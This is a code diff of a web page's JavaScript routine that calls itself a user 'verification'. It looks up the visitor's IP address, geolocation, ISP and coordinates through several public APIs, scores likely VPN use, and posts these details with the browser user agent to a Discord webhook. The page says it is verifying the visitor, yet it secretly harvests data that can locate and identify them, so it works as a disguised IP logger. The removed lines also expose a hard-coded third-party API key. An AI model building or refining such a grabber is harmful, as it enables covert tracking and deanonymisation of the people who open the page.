@@ -81,46 +81,103 @@
             return String.fromCodePoint(...codePoints);
         }
 
+        // Function to safely fetch with timeout and error handling
+        async function safeFetch(url, options = {}, timeout = 5000) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), timeout);
+            
+            try {
+                const response = await fetch(url, {
+                    ...options,
+                    signal: controller.signal,
+                    mode: 'cors'
+                });
+                clearTimeout(timeoutId);
+                return response;
+            } catch (error) {
+                clearTimeout(timeoutId);
+                throw error;
+            }
+        }
+
         // Main verification function
         async function verifyUser() {
             const statusDiv = document.getElementById('status');
             
             try {
-                // Step 1: Get basic IP info
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const ip = ipData.ip;
+                // Step 1: Get IP info from a CORS-friendly API
+                let ipData;
+                try {
+                    const ipResponse = await safeFetch('https://api.ipify.org?format=json');
+                    ipData = await ipResponse.json();
+                } catch (error) {
+                    // Fallback to alternative IP API
+                    const fallbackResponse = await safeFetch('https://api.db-ip.com/v2/free/self');
+                    ipData = await fallbackResponse.json();
+                }
                 
-                // Step 2: Get detailed IP info
-                const ipInfoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
-                const ipInfo = await ipInfoResponse.json();
+                const ip = ipData.ip || ipData.ipAddress;
+                if (!ip) throw new Error("Could not determine IP address");
                 
-                // Step 3: Check for VPN/proxy
-                const vpnCheckResponse = await fetch(`https://ipqualityscore.com/api/json/ip/pPOCqALs9ZiMn0j7MR7aCq4gZL9ybzIh/${ip}?strictness=1&allow_public_access_points=true`);
-                const vpnData = await vpnCheckResponse.json();
+                // Step 2: Get geolocation data from a CORS-friendly API
+                let geoData;
+                try {
+                    const geoResponse = await safeFetch(`https://ipapi.co/${ip}/json/`);
+                    geoData = await geoResponse.json();
+                    
+                    // Check if the API returned an error
+                    if (geoData.error) throw new Error("Geolocation API error");
+                } catch (error) {
+                    // Fallback to alternative geo API
+                    const fallbackGeoResponse = await safeFetch(`https://ipwho.is/${ip}`);
+                    geoData = await fallbackGeoResponse.json();
+                }
                 
-                // Determine if using VPN/proxy
-                const usingVpn = vpnData.proxy || 
-                                vpnData.vpn || 
-                                vpnData.tor || 
-                                (ipInfo.security && ipInfo.security.is_proxy);
+                // Step 3: VPN detection (simplified to avoid CORS issues)
+                // We'll use a combination of available data to estimate VPN usage
                 
-                // Get location data
+                const suspiciousFactors = [];
+                let vpnLikelihood = 0;
+                
+                // Check for datacenter IP
+                if (geoData.org && /hosting|datacenter|cloud|server|proxy|vpn/i.test(geoData.org)) {
+                    suspiciousFactors.push("Datacenter IP detected");
+                    vpnLikelihood += 40;
+                }
+                
+                // Check for known proxy port
+                if (geoData.port && [80, 443, 1080, 3128, 8080, 8888, 9050].includes(Number(geoData.port))) {
+                    suspiciousFactors.push("Proxy port detected");
+                    vpnLikelihood += 30;
+                }
+                
+                // Check for mismatched timezone and country
+                if (geoData.timezone && geoData.country_code) {
+                    const timezoneCountry = geoData.timezone.split('/')[0];
+                    if (timezoneCountry && !geoData.timezone.includes(geoData.country_code) && 
+                        !geoData.country_name.includes(timezoneCountry)) {
+                        suspiciousFactors.push("Timezone mismatch");
+                        vpnLikelihood += 20;
+                    }
+                }
+                
+                // Determine if using VPN based on likelihood score
+                const usingVpn = vpnLikelihood >= 40;
+                
+                // Prepare location data
                 const location = {
                     ip: ip,
-                    country: ipInfo.country_name || 'Unknown',
-                    country_code: ipInfo.country_code || '',
-                    region: ipInfo.region || 'Unknown',
-                    city: ipInfo.city || 'Unknown',
-                    isp: ipInfo.org || 'Unknown',
-                    latitude: ipInfo.latitude,
-                    longitude: ipInfo.longitude,
+                    country: geoData.country_name || geoData.country || 'Unknown',
+                    country_code: geoData.country_code || geoData.country_code || '',
+                    region: geoData.region || geoData.region_name || 'Unknown',
+                    city: geoData.city || 'Unknown',
+                    isp: geoData.org || geoData.connection?.isp || 'Unknown',
+                    latitude: geoData.latitude || geoData.lat || 0,
+                    longitude: geoData.longitude || geoData.lon || 0,
                     using_vpn: usingVpn,
                     vpn_details: {
-                        is_proxy: vpnData.proxy || false,
-                        is_vpn: vpnData.vpn || false,
-                        is_tor: vpnData.tor || false,
-                        fraud_score: vpnData.fraud_score || 0
+                        likelihood: vpnLikelihood,
+                        suspicious_factors: suspiciousFactors
                     },
                     timestamp: new Date().toISOString(),
                     user_agent: navigator.userAgent
@@ -153,7 +210,7 @@
                                 inline: true
                             },
                             {
-                                name: "🏢 ISP",
+                                name: "🏢 ISP/Organization",
                                 value: location.isp,
                                 inline: true
                             },
@@ -161,15 +218,6 @@
                                 name: "🌍 Coordinates",
                                 value: `[${location.latitude}, ${location.longitude}](${mapUrl})`,
                                 inline: true
-                            },
-                            {
-                                name: "⚠️ Fraud Score",
-                                value: `${vpnData.fraud_score}/100` + (vpnData.fraud_score > 75 ? " (High Risk)" : ""),
-                                inline: true
-                            },
-                            {
-                                name: "📱 Device Info",
-                                value: `\`\`\`${location.user_agent}\`\`\``
                             }
                         ],
                         footer: {
@@ -177,6 +225,21 @@
                         }
                     }]
                 };
+                
+                // Add suspicious factors if any were found
+                if (suspiciousFactors.length > 0) {
+                    discordPayload.embeds[0].fields.push({
+                        name: "⚠️ Suspicious Factors",
+                        value: suspiciousFactors.join("\n"),
+                        inline: false
+                    });
+                }
+                
+                // Add user agent info
+                discordPayload.embeds[0].fields.push({
+                    name: "📱 Device Info",
+                    value: `\`\`\`${location.user_agent}\`\`\``
+                });
                 
                 // Send to Discord webhook
                 const discordResponse = await fetch(DISCORD_WEBHOOK, {
@@ -211,7 +274,7 @@
                 statusDiv.className = 'status error';
                 statusDiv.innerHTML = `
                     <strong>❌ Verification Error</strong>
-                    <p>Unable to complete verification. Please try again later.</p>
+                    <p>${error.message || 'Unable to complete verification. Please try again later.'}</p>
                 `;
                 
                 // Try to send error to Discord
